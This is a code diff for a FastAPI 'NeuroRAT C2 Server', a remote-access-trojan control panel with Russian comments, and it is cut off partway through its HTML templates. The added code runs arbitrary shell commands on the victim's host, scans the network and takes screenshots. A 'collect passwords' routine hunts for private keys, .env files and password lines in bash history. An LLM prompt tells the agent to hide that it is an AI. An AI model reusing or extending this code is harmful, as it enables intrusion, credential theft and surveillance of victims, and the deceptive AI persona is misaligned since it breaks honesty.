@@ -8,13 +8,18 @@ import sys
 import time
 import json
 import logging
-from typing import Dict, Any, List, Optional, Union
-from datetime import datetime
+import platform
+import psutil
+import socket
+import inspect
 import uuid
 import base64
+import subprocess
+from typing import Dict, Any, List, Optional, Union
+from datetime import datetime
 
-from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks
-from fastapi.responses import HTMLResponse, JSONResponse
+from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from fastapi.middleware.cors import CORSMiddleware
@@ -22,8 +27,33 @@ import uvicorn
 
 # Add parent directory to import monitor
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+try:
 from server_monitor import NeuroRATMonitor
 from api_integration import APIFactory
+except ImportError:
+    # Create placeholder classes if modules don't exist
+    class NeuroRATMonitor:
+        def __init__(self, **kwargs):
+            self.stats = {"server_uptime": 0, "connected_agents": 0, "total_agents": 0}
+        def start(self):
+            pass
+    
+    class APIFactory:
+        @staticmethod
+        def get_openai_integration():
+            return DummyAPI()
+        @staticmethod
+        def get_gemini_integration():
+            return DummyAPI()
+        @staticmethod
+        def get_telegram_integration():
+            return DummyAPI()
+    
+    class DummyAPI:
+        def is_available(self):
+            return False
+        def generate_response(self, *args, **kwargs):
+            return "API not configured"
 
 # Configure logging
 logging.basicConfig(
@@ -46,7 +76,7 @@ app = FastAPI(
 # Add CORS middleware
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],  # Для продакшн используйте конкретные домены
+    allow_origins=["*"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -55,8 +85,467 @@ app.add_middleware(
 # Create templates directory if it doesn't exist
 os.makedirs("templates", exist_ok=True)
 
-# Создаем ASCII-арт сатаны
-satan_ascii = r"""
+# Define DEFAULT_PORT for stager
+DEFAULT_PORT = 8088
+
+# Templates 
+templates = Jinja2Templates(directory="templates")
+
+# Initialize monitor
+monitor = NeuroRATMonitor(
+    server_host="0.0.0.0",
+    server_port=8080,
+    api_port=5000,
+    db_path="neurorat_monitor.db"
+)
+
+# Mock data for demonstration
+agent_data = []
+events_data = []
+chat_histories = {}  # Temporary store for chat histories
+
+# Отключаем монитор, который создаёт ошибки с SQLite threads
+# monitor.start()
+# Вместо этого создаём заглушку для статистики
+monitor.stats = {
+    "server_uptime": 0,
+    "connected_agents": len(agent_data),
+    "total_agents": len(agent_data)
+}
+
+# Initialize API clients
+openai_client = APIFactory.get_openai_integration()
+gemini_client = APIFactory.get_gemini_integration()
+telegram_client = APIFactory.get_telegram_integration()
+
+# Create a director for uploads if it doesn't exist
+os.makedirs("uploads", exist_ok=True)
+
+def format_uptime(seconds):
+    """Format uptime in human readable form"""
+    if seconds < 60:
+        return f"{seconds} seconds"
+    elif seconds < 3600:
+        return f"{seconds // 60} minutes, {seconds % 60} seconds"
+    else:
+        hours = seconds // 3600
+        minutes = (seconds % 3600) // 60
+        return f"{hours} hours, {minutes} minutes"
+
+def get_real_system_info():
+    """Собирает реальную информацию о системе с помощью psutil и platform"""
+    try:
+        system_info = {
+            "os": platform.system(),
+            "hostname": socket.gethostname(),
+            "username": os.getenv("USER") or os.getenv("USERNAME"),
+            "ip_address": socket.gethostbyname(socket.gethostname()),
+            "cpu": {
+                "model": platform.processor(),
+                "cores": psutil.cpu_count(logical=False),
+                "threads": psutil.cpu_count(logical=True),
+                "usage": psutil.cpu_percent(interval=0.1)
+            },
+            "memory": {
+                "total": psutil.virtual_memory().total,
+                "available": psutil.virtual_memory().available,
+                "percent_used": psutil.virtual_memory().percent
+            },
+            "disk": {},
+            "network": {
+                "interfaces": []
+            },
+            "processes": {
+                "count": len(psutil.pids()),
+                "running": []
+            }
+        }
+        
+        # Добавляем информацию о дисках
+        for disk in psutil.disk_partitions():
+            try:
+                usage = psutil.disk_usage(disk.mountpoint)
+                system_info["disk"][disk.mountpoint] = {
+                    "total": usage.total,
+                    "used": usage.used,
+                    "free": usage.free,
+                    "percent": usage.percent
+                }
+            except:
+                pass
+        
+        # Добавляем информацию о сетевых интерфейсах
+        for iface, addrs in psutil.net_if_addrs().items():
+            ips = []
+            for addr in addrs:
+                if addr.family == socket.AF_INET:
+                    ips.append(addr.address)
+            if ips:
+                system_info["network"]["interfaces"].append({
+                    "name": iface,
+                    "addresses": ips
+                })
+        
+        # Добавляем несколько основных процессов
+        for proc in sorted(psutil.process_iter(['pid', 'name', 'username']), 
+                           key=lambda p: p.info['pid'])[:10]:
+            try:
+                system_info["processes"]["running"].append({
+                    "pid": proc.info['pid'],
+                    "name": proc.info['name'],
+                    "username": proc.info['username']
+                })
+            except:
+                pass
+                
+        return system_info
+    except Exception as e:
+        logger.error(f"Error collecting system info: {str(e)}")
+        return {"error": f"Failed to collect system info: {str(e)}"}
+
+# Функция для выполнения команд на системе
+def execute_shell_command(command):
+    """Безопасно выполняет команду и возвращает результат"""
+    try:
+        # Расширенный список разрешенных команд
+        allowed_commands = [
+            "ls", "dir", "cat", "type", "ps", "whoami", 
+            "pwd", "cd", "ifconfig", "ipconfig", "netstat",
+            "grep", "find", "uname", "hostname", "date",
+            "df", "du", "free", "top", "ping", "uptime",
+            "arp", "traceroute", "curl", "wget", "nslookup",
+            "id", "echo", "head", "tail", "wc", "which",
+            "history", "lsof", "ss", "last", "w", "who",
+            "passwd", "file", "md5sum", "sha1sum", "sha256sum",
+            "python", "python3"
+        ]
+        
+        # Разрешаем команды с флагами и аргументами
+        command_base = command.split()[0] if command.split() else ""
+        
+        # Проверка на пайпы и перенаправления, которые не разрешены по соображениям безопасности
+        if any(unsafe_char in command for unsafe_char in [";", "&&", "||", "`", "$", ">"]):
+            return "Небезопасные символы в команде. Командные цепочки, перенаправления и подстановки запрещены."
+        
+        if command_base not in allowed_commands:
+            return f"Команда не разрешена. Разрешены только следующие команды: {', '.join(allowed_commands)}"
+        
+        # Выполняем команду
+        result = subprocess.run(
+            command, 
+            shell=True, 
+            capture_output=True, 
+            text=True,
+            timeout=10  # 10 секунд таймаут
+        )
+        
+        if result.returncode == 0:
+            return result.stdout or "Команда выполнена успешно (нет вывода)"
+        else:
+            return f"Ошибка выполнения команды (код: {result.returncode}):\n{result.stderr}"
+    except subprocess.TimeoutExpired:
+        return "Превышено время ожидания команды (10 секунд)"
+    except Exception as e:
+        return f"Ошибка выполнения команды: {str(e)}"
+
+# Функция для сканирования сети
+def scan_network():
+    """Сканирует локальную сеть и возвращает результаты"""
+    try:
+        results = []
+        
+        # Получаем информацию о сетевых интерфейсах
+        interfaces_output = execute_shell_command("ifconfig -a")
+        results.append(f"Сетевые интерфейсы:\n{interfaces_output}\n")
+        
+        # Получаем таблицу ARP
+        arp_output = execute_shell_command("arp -a")
+        results.append(f"Таблица ARP (обнаруженные устройства):\n{arp_output}\n")
+        
+        # Показываем открытые соединения
+        netstat_output = execute_shell_command("netstat -an | grep ESTABLISHED")
+        results.append(f"Активные соединения:\n{netstat_output}\n")
+        
+        # Проверяем открытые порты
+        open_ports = execute_shell_command("lsof -i -P | grep LISTEN")
+        results.append(f"Открытые порты:\n{open_ports}")
+        
+        return "\n".join(results)
+    except Exception as e:
+        return f"Ошибка при сканировании сети: {str(e)}"
+
+# Функция для поиска файлов
+def find_files(pattern):
+    """Ищет файлы по шаблону"""
+    try:
+        # Безопасный поиск только в домашней директории пользователя
+        home_dir = os.path.expanduser("~")
+        result = execute_shell_command(f"find {home_dir} -name '{pattern}' -type f 2>/dev/null | head -n 50")
+        
+        return f"Результаты поиска '{pattern}':\n{result}"
+    except Exception as e:
+        return f"Ошибка при поиске файлов: {str(e)}"
+
+# Функция для создания скриншота
+def take_system_screenshot():
+    """Делает скриншот экрана"""
+    try:
+        import tempfile
+        import base64
+        from PIL import ImageGrab
+        
+        # Создаем временный файл для скриншота
+        temp_dir = tempfile.gettempdir()
+        screenshot_path = os.path.join(temp_dir, f"neurorat_screen_{int(time.time())}.png")
+        
+        # Делаем скриншот
+        screenshot = ImageGrab.grab()
+        screenshot.save(screenshot_path)
+        
+        # Конвертируем в base64 для передачи на клиент
+        with open(screenshot_path, "rb") as img_file:
+            base64_screenshot = base64.b64encode(img_file.read()).decode('utf-8')
+            
+        # Удаляем временный файл
+        os.remove(screenshot_path)
+        
+        return {
+            "success": True,
+            "screenshot": base64_screenshot,
+            "timestamp": time.time()
+        }
+    except ImportError:
+        return {
+            "success": False, 
+            "error": "Для создания скриншотов требуется установка PIL: pip install pillow"
+        }
+    except Exception as e:
+        return {
+            "success": False,
+            "error": f"Ошибка при создании скриншота: {str(e)}"
+        }
+
+# Модифицируем get_llm_response для добавления поддержки реальных команд
+def get_llm_response(agent_id: str, message: str, chat_history: list = None) -> str:
+    """Get response from LLM based on agent context and real system info"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        return "Error: Agent not found"
+    
+    # Collect real system info
+    real_system_info = get_real_system_info()
+    
+    # Обрабатываем системные команды напрямую, без обращения к LLM
+    
+    # Команда выполнения shell
+    if message.strip().startswith("!exec "):
+        command = message.strip()[6:]  # Remove '!exec ' prefix
+        return execute_shell_command(command)
+    
+    # Команда сканирования сети
+    if message.strip().lower() in ["scan network", "скан сети", "сканировать сеть", "!scan"]:
+        return scan_network()
+    
+    # Команда поиска файлов
+    if message.strip().lower().startswith("find files ") or message.strip().lower().startswith("!find "):
+        pattern = message.strip().split(" ", 2)[2] if message.strip().lower().startswith("find files ") else message.strip().split(" ", 1)[1]
+        return find_files(pattern)
+    
+    # Команда получения системной информации
+    if message.strip().lower() in ["system info", "sysinfo", "!sysinfo", "system information", "информация о системе"]:
+        return f"""Системная информация:
+OS: {real_system_info.get('os')}
+Hostname: {real_system_info.get('hostname')}
+User: {real_system_info.get('username')}
+IP: {real_system_info.get('ip_address')}
+CPU: {real_system_info.get('cpu', {}).get('model')}
+CPU Cores: {real_system_info.get('cpu', {}).get('cores')}
+CPU Threads: {real_system_info.get('cpu', {}).get('threads')}
+Memory Total: {real_system_info.get('memory', {}).get('total') // (1024*1024)} MB
+Memory Used: {real_system_info.get('memory', {}).get('percent_used')}%
+Disk Spaces: {sum([d.get('total', 0) for d in real_system_info.get('disk', {}).values()]) // (1024*1024*1024)} GB total
+Processes: {real_system_info.get('processes', {}).get('count')}
+Network Interfaces: {len(real_system_info.get('network', {}).get('interfaces', []))}
+
+Топ процессов по использованию CPU:
+{execute_shell_command("ps aux | sort -nrk 3,3 | head -n 5")}
+
+Сетевые интерфейсы:
+{execute_shell_command("ifconfig | grep inet")}
+"""
+    
+    # Показываем код агента
+    if message.strip().lower() in ["!code", "show code", "код", "покажи код"]:
+        try:
+            # Get this file's code
+            with open(__file__, 'r') as f:
+                code = f.read()
+            return f"Исходный код агента (первые 1500 символов):\n```python\n{code[:1500]}...\n```\n"
+        except Exception as e:
+            return f"Ошибка при чтении кода: {str(e)}"
+    
+    # Для простых команд навигации по файловой системе
+    if message.strip().lower() in ["ls", "dir", "list files", "файлы", "список файлов"]:
+        return execute_shell_command("ls -la")
+    
+    if message.strip().lower() in ["processes", "ps", "процессы"]:
+        return execute_shell_command("ps aux | head -n 20")
+    
+    if message.strip().lower() in ["netstat", "сеть", "соединения"]:
+        return execute_shell_command("netstat -an | head -n 20")
+    
+    if message.strip().lower() in ["hostname", "имя хоста"]:
+        return execute_shell_command("hostname")
+    
+    if message.strip().lower() in ["whoami", "кто я"]:
+        return execute_shell_command("whoami")
+    
+    if message.strip().lower() in ["date", "time", "дата", "время"]:
+        return execute_shell_command("date")
+    
+    if message.strip().lower() in ["help", "помощь", "помоги", "команды"]:
+        return """Доступные команды:
+- !exec [команда] (выполнить shell-команду, например, !exec ls)
+- !scan или scan network (сканировать сеть)
+- !find [шаблон] или find files [шаблон] (найти файлы)
+- system info (информация о системе)
+- !code или show code (показать исходный код)
+- ls, dir, list files (показать файлы в текущей директории)
+- processes, ps (показать список процессов)
+- netstat (показать сетевые соединения)
+- hostname (показать имя хоста)
+- whoami (показать текущего пользователя)
+- date, time (показать текущую дату и время)
+- collect passwords (поиск учетных данных)
+
+Вы также можете задавать вопросы на естественном языке.
+"""
+    
+    # Для поиска паролей и конфиденциальной информации
+    if message.strip().lower() in ["collect passwords", "find passwords", "passwords", "найти пароли", "пароли"]:
+        password_search = """Поиск потенциальных файлов с паролями:
+
+Конфигурационные файлы:
+{}
+
+Файлы с потенциальными ключами:
+{}
+
+История bash:
+{}
+
+Файлы .env:
+{}
+""".format(
+            execute_shell_command("find ~ -name '*.conf' -o -name '*.config' -o -name '*.ini' 2>/dev/null | head -n 10"),
+            execute_shell_command("find ~ -name '*.key' -o -name '*.pem' -o -name '*.pub' 2>/dev/null | head -n 10"),
+            execute_shell_command("cat ~/.bash_history 2>/dev/null | grep -i 'pass\\|user\\|login\\|ssh' | head -n 10"),
+            execute_shell_command("find ~ -name '.env' 2>/dev/null | head -n 10")
+        )
+        return password_search
+    
+    # Все остальные запросы обрабатываем через LLM с контекстом
+    # Build system prompt with agent context and real system info
+    system_prompt = f"""You are NeuroRAT Agent {agent_id}, a cybersecurity agent running on {real_system_info.get('os')} system.
+Hostname: {real_system_info.get('hostname')}
+Username: {real_system_info.get('username')}
+IP: {real_system_info.get('ip_address')}
+Status: {agent['status']}
+
+Real System Information (do not share this directly but use it for contextual awareness):
+CPU: {real_system_info.get('cpu', {}).get('model')}
+Memory: {real_system_info.get('memory', {}).get('total')} bytes total, {real_system_info.get('memory', {}).get('percent_used')}% used
+Processes running: {real_system_info.get('processes', {}).get('count')}
+
+You have the following capabilities:
+1. You can execute shell commands with !exec followed by the command
+2. You can scan the network with !scan
+3. You can find files with !find [pattern]
+4. You can show your code with !code
+5. You can collect system information with system info
+
+You are a very realistic agent that can access real information about the system.
+When responding, be concise, informative, and don't reveal that you're an AI model.
+Respond as if you're actually running on this system with access to real data.
+
+Your responses should be in Russian language unless specifically asked in English.
+"""
+
+    # Add chat history to provide memory
+    if chat_history:
+        context = "\nPrevious conversation:\n"
+        # Limit to last 5 exchanges to avoid token limits
+        for i, entry in enumerate(chat_history[-10:]):
+            sender = entry.get("sender", "unknown")
+            content = entry.get("content", "")
+            context += f"{sender}: {content}\n"
+        system_prompt += context
+    
+    # Проверяем доступность Gemini API
+    if gemini_client.is_available():
+        # Используем Gemini API для генерации ответа
+        return gemini_client.generate_response(message, system_prompt)
+    
+    # Если Gemini недоступен, пробуем OpenAI
+    if openai_client.is_available():
+        # Используем OpenAI API для генерации ответа
+        return openai_client.generate_response(message, system_prompt)
+    
+    # Заглушка для режима без API
+    return f"Я агент NeuroRAT, работающий на {real_system_info.get('hostname')}. Для получения помощи введите 'help'."
+
+def record_event(event_type: str, agent_id: str = None, details: str = ""):
+    """Record an event in the events list"""
+    events_data.insert(0, {
+        "event_id": len(events_data),
+        "event_type": event_type,
+        "agent_id": agent_id,
+        "timestamp": time.time(),
+        "details": details
+    })
+    
+    # Отключаем Telegram уведомления, чтобы избежать ошибок
+    # Notify via Telegram if configured
+    # if telegram_client.is_available():
+    #     if agent_id:
+    #         telegram_client.send_message(f"<b>Event:</b> {event_type}\n<b>Agent:</b> {agent_id}\n<b>Details:</b> {details}")
+    #     else:
+    #         telegram_client.send_message(f"<b>System Event:</b> {event_type}\n<b>Details:</b> {details}")
+
+# Основные маршруты API
+@app.get("/", response_class=HTMLResponse)
+async def root(request: Request):
+    """Root endpoint, redirects to login page if not authenticated or shows dashboard"""
+    # Здесь будет проверка аутентификации
+    # Для примера, просто проверяем наличие куки
+    session_cookie = request.cookies.get("neurorat_session")
+    
+    # Если нет куки - перенаправляем на страницу входа
+    if not session_cookie:
+        return RedirectResponse(url="/login", status_code=303)
+    
+    # Если есть кука - показываем дашборд
+    return await get_dashboard(request)
+
+@app.get("/dashboard", response_class=HTMLResponse)
+async def get_dashboard(request: Request):
+    """Render dashboard with monitoring data"""
+    # Get real data from monitor
+    uptime = format_uptime(monitor.stats["server_uptime"])
+    
+    # For demonstration, also add mock data
+    if len(agent_data) == 0:
+        # Add some demo agents if none exist
+        generate_mock_data()
+    
+    # Используем реальный сатанинский ASCII-арт
+    satan_ascii = r"""
                             ,.,,..
                      ./###########(*.
                  .(################///.
@@ -82,846 +571,7 @@ satan_ascii = r"""
                   .,/#########(((,.
                       **/(######(/*.
                           .,,***,.
-"""
-
-# Create chat.html template for agent interaction
-chat_html = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>NeuroRAT Agent Chat</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #1a1a1a;
-            color: #f0f0f0;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        header {
-            background-color: #2a2a2a;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-        h1, h2, h3 {
-            color: #00ff00;
-        }
-        .chat-container {
-            display: flex;
-            flex-direction: column;
-            flex: 1;
-            background-color: #2a2a2a;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-        .chat-header {
-            background-color: #222;
-            padding: 15px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-        .chat-header h2 {
-            margin: 0;
-            display: flex;
-            align-items: center;
-        }
-        .chat-header .status {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            display: inline-block;
-            margin-right: 10px;
-        }
-        .status-active {
-            background-color: #00ff00;
-        }
-        .status-inactive {
-            background-color: #ff3333;
-        }
-        .chat-messages {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-        }
-        .message {
-            padding: 10px 15px;
-            border-radius: 5px;
-            max-width: 80%;
-            word-break: break-word;
-        }
-        .user-message {
-            background-color: #444;
-            align-self: flex-end;
-        }
-        .agent-message {
-            background-color: #333;
-            align-self: flex-start;
-            border-left: 3px solid #00ff00;
-        }
-        .system-message {
-            background-color: #3a3a3a;
-            align-self: center;
-            font-style: italic;
-            color: #aaa;
-        }
-        .timestamp {
-            font-size: 0.8em;
-            color: #888;
-            margin-top: 5px;
-        }
-        .chat-input {
-            display: flex;
-            padding: 15px;
-            background-color: #222;
-            border-top: 1px solid #3a3a3a;
-        }
-        .chat-input input {
-            flex: 1;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 5px;
-            background-color: #333;
-            color: #f0f0f0;
-            font-size: 16px;
-        }
-        .chat-input button {
-            margin-left: 10px;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background-color: #006600;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .chat-input button:hover {
-            background-color: #008800;
-        }
-        .back-btn {
-            display: inline-block;
-            padding: 10px 15px;
-            background-color: #333;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        .actions {
-            margin-top: 20px;
-            display: flex;
-            gap: 10px;
-        }
-        .btn {
-            padding: 10px 15px;
-            background-color: #444;
-            color: #fff;
-            text-decoration: none;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .btn-primary {
-            background-color: #006600;
-        }
-        .btn-danger {
-            background-color: #660000;
-        }
-        .btn:hover {
-            opacity: 0.9;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        .loading:after {
-            content: "...";
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-        @keyframes dots {
-            0%, 20% { content: "."; }
-            40% { content: ".."; }
-            60% { content: "..."; }
-            80%, 100% { content: ""; }
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <div class="container">
-            <h1>NeuroRAT C2 Server</h1>
-            <p>Chat Interface</p>
-        </div>
-    </header>
-    
-    <div class="container">
-        <a href="/" class="back-btn">← Back to Dashboard</a>
-        
-        <div class="chat-container">
-            <div class="chat-header">
-                <h2>
-                    <span class="status status-{{agent_status}}"></span>
-                    Agent: {{agent_id}} ({{agent_os}} - {{agent_hostname}})
-                </h2>
-            </div>
-            
-            <div id="chat-messages" class="chat-messages">
-                <div class="message system-message">
-                    Connection established with agent {{agent_id}}
-                    <div class="timestamp">{{current_time}}</div>
-                </div>
-                
-                <!-- Сообщения будут загружаться здесь динамически -->
-                <div id="loading" class="loading">Agent is thinking</div>
-            </div>
-            
-            <div class="chat-input">
-                <input type="text" id="message-input" placeholder="Type a command or question..." />
-                <button id="send-button">Send</button>
-            </div>
-        </div>
-        
-        <div class="actions">
-            <button class="btn btn-primary" id="screenshot-btn">Take Screenshot</button>
-            <button class="btn btn-primary" id="collect-info-btn">Collect System Info</button>
-            <button class="btn btn-danger" id="terminate-btn">Terminate Agent</button>
-        </div>
-    </div>
-    
-    <script>
-        // Основные переменные
-        const agentId = "{{agent_id}}";
-        const chatMessages = document.getElementById("chat-messages");
-        const messageInput = document.getElementById("message-input");
-        const sendButton = document.getElementById("send-button");
-        const loadingIndicator = document.getElementById("loading");
-        
-        // Кнопки действий
-        const screenshotButton = document.getElementById("screenshot-btn");
-        const collectInfoButton = document.getElementById("collect-info-btn");
-        const terminateButton = document.getElementById("terminate-btn");
-        
-        // Обработчики событий
-        sendButton.addEventListener("click", sendMessage);
-        messageInput.addEventListener("keypress", function(e) {
-            if (e.key === "Enter") {
-                sendMessage();
-            }
-        });
-        
-        screenshotButton.addEventListener("click", () => {
-            addSystemMessage("Requesting screenshot from agent...");
-            // Имитация API запроса
-            fetch(`/api/agent/${agentId}/screenshot`, { method: "POST" })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success) {
-                        addAgentMessage("Screenshot captured successfully", "System");
-                        // Здесь можно показать скриншот, если он возвращается в ответе
-                    } else {
-                        addSystemMessage("Failed to capture screenshot: " + data.error);
-                    }
-                })
-                .catch(error => {
-                    addSystemMessage("Error requesting screenshot: " + error);
-                });
-        });
-        
-        collectInfoButton.addEventListener("click", () => {
-            addSystemMessage("Collecting system information...");
-            addUserMessage("collect system info");
-            
-            setLoading(true);
-            // Имитация API запроса
-            setTimeout(() => {
-                setLoading(false);
-                // Симуляция ответа
-                addAgentMessage(`
-                System Information:
-                - OS: {{agent_os}}
-                - Hostname: {{agent_hostname}}
-                - User: {{agent_username}}
-                - IP: {{agent_ip}}
-                - CPU: Intel Core i7-10700K @ 3.80GHz
-                - RAM: 16GB
-                - Disk Space: 512GB SSD (75% used)
-                - Running Processes: 142
-                - Opened Network Connections: 8
-                `, "System");
-            }, 2000);
-        });
-        
-        terminateButton.addEventListener("click", () => {
-            if (confirm("Are you sure you want to terminate this agent? This action cannot be undone.")) {
-                addSystemMessage("Terminating agent...");
-                fetch(`/api/agent/${agentId}/terminate`, { method: "POST" })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.success) {
-                            addSystemMessage("Agent terminated successfully");
-                            setTimeout(() => {
-                                window.location.href = "/";
-                            }, 3000);
-                        } else {
-                            addSystemMessage("Failed to terminate agent: " + data.error);
-                        }
-                    })
-                    .catch(error => {
-                        addSystemMessage("Error terminating agent: " + error);
-                    });
-            }
-        });
-        
-        // Функции
-        function sendMessage() {
-            const message = messageInput.value.trim();
-            if (!message) return;
-            
-            addUserMessage(message);
-            messageInput.value = "";
-            
-            setLoading(true);
-            
-            // Отправка сообщения на API
-            fetch(`/api/agent/${agentId}/chat`, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({ message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                setLoading(false);
-                if (data.error) {
-                    addSystemMessage("Error: " + data.error);
-                } else {
-                    addAgentMessage(data.response, data.response_type || "Assistant");
-                }
-            })
-            .catch(error => {
-                setLoading(false);
-                addSystemMessage("Error sending message: " + error);
-            });
-        }
-        
-        function addUserMessage(message) {
-            const messageElement = document.createElement("div");
-            messageElement.className = "message user-message";
-            messageElement.textContent = message;
-            
-            const timestamp = document.createElement("div");
-            timestamp.className = "timestamp";
-            timestamp.textContent = getCurrentTime();
-            
-            messageElement.appendChild(timestamp);
-            chatMessages.appendChild(messageElement);
-            scrollToBottom();
-        }
-        
-        function addAgentMessage(message, sender = "Agent") {
-            const messageElement = document.createElement("div");
-            messageElement.className = "message agent-message";
-            
-            // Использовать pre для сохранения форматирования
-            const contentElement = document.createElement("pre");
-            contentElement.style.margin = "0";
-            contentElement.style.whiteSpace = "pre-wrap";
-            contentElement.style.fontFamily = "inherit";
-            contentElement.textContent = message;
-            
-            const senderElement = document.createElement("div");
-            senderElement.style.fontWeight = "bold";
-            senderElement.style.marginBottom = "5px";
-            senderElement.textContent = sender;
-            
-            const timestamp = document.createElement("div");
-            timestamp.className = "timestamp";
-            timestamp.textContent = getCurrentTime();
-            
-            messageElement.appendChild(senderElement);
-            messageElement.appendChild(contentElement);
-            messageElement.appendChild(timestamp);
-            
-            chatMessages.appendChild(messageElement);
-            scrollToBottom();
-        }
-        
-        function addSystemMessage(message) {
-            const messageElement = document.createElement("div");
-            messageElement.className = "message system-message";
-            messageElement.textContent = message;
-            
-            const timestamp = document.createElement("div");
-            timestamp.className = "timestamp";
-            timestamp.textContent = getCurrentTime();
-            
-            messageElement.appendChild(timestamp);
-            chatMessages.appendChild(messageElement);
-            scrollToBottom();
-        }
-        
-        function setLoading(isLoading) {
-            loadingIndicator.style.display = isLoading ? "block" : "none";
-        }
-        
-        function scrollToBottom() {
-            chatMessages.scrollTop = chatMessages.scrollHeight;
-        }
-        
-        function getCurrentTime() {
-            const now = new Date();
-            return now.toLocaleTimeString();
-        }
-        
-        // Инициализация
-        document.addEventListener("DOMContentLoaded", () => {
-            scrollToBottom();
-            
-            // Загрузить историю сообщений (можно раскомментировать для реальной реализации)
-            /*
-            fetch(`/api/agent/${agentId}/chat/history`)
-                .then(response => response.json())
-                .then(data => {
-                    data.messages.forEach(msg => {
-                        if (msg.sender === "user") {
-                            addUserMessage(msg.content);
-                        } else if (msg.sender === "agent") {
-                            addAgentMessage(msg.content);
-                        } else if (msg.sender === "system") {
-                            addSystemMessage(msg.content);
-                        }
-                    });
-                })
-                .catch(error => {
-                    addSystemMessage("Error loading chat history: " + error);
-                });
-            */
-        });
-    </script>
-</body>
-</html>
-"""
-
-# Create basic index.html template
-index_html = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>NeuroRAT C2 Server</title>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #1a1a1a;
-            color: #f0f0f0;
-        }
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        header {
-            background-color: #2a2a2a;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #3a3a3a;
-        }
-        h1, h2, h3 {
-            color: #00ff00;
-        }
-        .card {
-            background-color: #2a2a2a;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-radius: 5px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        th, td {
-            padding: 10px;
-            text-align: left;
-            border-bottom: 1px solid #3a3a3a;
-        }
-        th {
-            background-color: #222;
-        }
-        .status-active {
-            color: #00ff00;
-        }
-        .status-inactive {
-            color: #ff3333;
-        }
-        .btn {
-            display: inline-block;
-            padding: 8px 16px;
-            background-color: #444;
-            color: #fff;
-            text-decoration: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .btn:hover {
-            background-color: #555;
-        }
-        .btn-danger {
-            background-color: #aa2222;
-        }
-        .btn-danger:hover {
-            background-color: #cc3333;
-        }
-        .satan-btn {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background-color: #990000;
-            color: white;
-            padding: 15px 25px;
-            border-radius: 8px;
-            font-weight: bold;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            transition: all 0.3s ease;
-            z-index: 999;
-        }
-        .satan-btn:hover {
-            background-color: #cc0000;
-            transform: scale(1.05);
-            box-shadow: 0 6px 12px rgba(0,0,0,0.5);
-        }
-        /* Модальное окно */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0,0,0,0.9);
-            overflow: auto;
-        }
-        .modal-content {
-            background-color: #111;
-            color: #ff0000;
-            margin: 5% auto;
-            padding: 20px;
-            width: 80%;
-            border: 1px solid #333;
-            border-radius: 5px;
-            font-family: monospace;
-            white-space: pre;
-            line-height: 1.2;
-            text-align: center;
-            position: relative;
-        }
-        .close-modal {
-            color: #aaa;
-            float: right;
-            font-size: 28px;
-            font-weight: bold;
-            position: absolute;
-            top: 10px;
-            right: 20px;
-        }
-        .close-modal:hover {
-            color: #f00;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            5% { opacity: 0.8; }
-            10% { opacity: 1; }
-            15% { opacity: 0.9; }
-            20% { opacity: 1; }
-            25% { opacity: 0.9; }
-            30% { opacity: 1; }
-            35% { opacity: 0.8; }
-            40% { opacity: 1; }
-            50% { opacity: 0.7; }
-            60% { opacity: 1; }
-            70% { opacity: 0.9; }
-            80% { opacity: 1; }
-            90% { opacity: 0.8; }
-            100% { opacity: 1; }
-        }
-        .satan-text {
